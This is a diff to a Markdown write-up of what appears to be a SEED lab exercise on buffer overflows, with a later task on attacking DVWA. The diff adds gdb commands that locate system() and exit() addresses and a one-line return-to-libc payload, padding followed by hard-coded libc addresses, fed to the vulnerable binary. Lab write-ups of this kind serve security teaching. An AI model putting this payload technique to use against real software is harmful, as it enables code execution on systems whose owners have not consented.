@@ -138,7 +138,8 @@ gdb -q vuln.out
 
 ```sh
 print system
-print sy
+print exit
+find /home/seed/seclabs/boff/vuln
 ```
 
 *The address of system() is: `0xf7e50db0`*  <br>
@@ -148,8 +149,11 @@ print sy
 
 ## 6. Conduct an attack: 
 
+```sh
+r $(python -c "print(20*'a' + '\xb0\x0d\xe5\xf7' + '\xe0\x49\xe4\xf7' + '\xf3\xd8\xff\xff')")
+``` 
 
-**Conclusion: **
+**Conclusion:**
 
 # Task 2: Attack on database of DVWA
 - Install dvwa (on host machine or docker container)
